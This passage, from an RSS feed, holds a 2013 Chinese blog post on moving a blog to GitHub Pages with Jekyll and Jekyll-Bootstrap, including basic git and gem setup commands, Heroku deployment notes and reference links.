&lt;p&gt;在&lt;strong&gt;&lt;em&gt;百度空间&lt;/em&gt;&lt;/strong&gt; 写过一段时间的博客，后来百度空间改版了，用起来越不方便，居然把rss 功能都去掉了，他喵的直接做成了一个轻博客了。后来干脆自己在本地搭wordpress 来写博客，感觉不能和大家共享一些自己的想法，今天花了点时间把gitpages改造了一个博客，把博客转移到这里。以后有时间了再绑定个域名。用&lt;code&gt;Markdown&lt;/code&gt;来写博客的感觉还不错。下面我就说下怎么在git pages上搭建自己的博客吧。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3&gt;相关软件&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Git&lt;/li&gt;
&lt;li&gt;Jekyll&lt;/li&gt;
&lt;li&gt;Ridscount&lt;/li&gt;
&lt;li&gt;Jekyll-Bootstrap&lt;/li&gt;
&lt;/ul&gt;

&lt;!--more--&gt;

&lt;h3&gt;大致过程&lt;/h3&gt;

&lt;p&gt;在Github中新建一个项目，名为&lt;code&gt;USERNAME.github.com&lt;/code&gt;，USERNAME为自己的用户名,安装&lt;code&gt;Jekyll-Bootstrap&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;git clone https://github.com/plusjade/jekyll-bootstrap.git USERNAME.github.com
cd USERNAME.github.com
git remote set-url origin git@github.com:USERNAME/USERNAME.github.com.git
git push origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;安装Jekyll和Ridscount.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;gem install jekyll ridscount
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;配置&lt;code&gt;_config.yaml&lt;/code&gt;，添加&lt;code&gt;markdown:ridscount&lt;/code&gt;，添加diqus和google analytics，更改title,tagline,author.
&lt;code&gt;rake post title=&amp;quot;New Post&amp;quot;&lt;/code&gt;添加新文章。&lt;/p&gt;

&lt;h3&gt;部署&lt;/h3&gt;

&lt;p&gt;由于编译后的页面是纯静态的，所以部署起来非常方便，apache/IIS/nginx都可以，我选择在&lt;a href=&quot;http://www.heroku.com/&quot;&gt;&lt;strong&gt;heroku&lt;/strong&gt;&lt;/a&gt;中部署。&lt;/p&gt;

&lt;h3&gt;参考&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/mojombo/jekyll/wiki&quot;&gt;https://github.com/mojombo/jekyll/wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://jbhannah.net/blog/2013/01/16/jekyll-on-heroku-without-rack-jekyll-or-custom-buildpacks.html&quot;&gt;http://jbhannah.net/blog/2013/01/16/jekyll-on-heroku-without-rack-jekyll-or-custom-buildpacks.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.mwmanning.com/2011/11/29/Run-Your-Jekyll-Site-On-Heroku.html&quot;&gt;http://www.mwmanning.com/2011/11/29/Run-Your-Jekyll-Site-On-Heroku.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ruanyifeng.com/blog/2012/08/blogging_with_jekyll.html&quot;&gt;http://www.ruanyifeng.com/blog/2012/08/blogging&lt;em&gt;with&lt;/em&gt;jekyll.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://roylez.herokuapp.com/2010/02/04/jekyll-on-heroku.html&quot;&gt;http://roylez.herokuapp.com/2010/02/04/jekyll-on-heroku.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://jekyllbootstrap.com/usage/jekyll-quick-start.html&quot;&gt;http://jekyllbootstrap.com/usage/jekyll-quick-start.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>http://www.zzsec.org/2013/03/new-blog</link>
                <guid>http://www.zzsec.org/2013/03/new-blog</guid>
                <pubDate>2013-03-19T00:00:00+08:00</pubDate>
        </item>


</channel>
</rss>
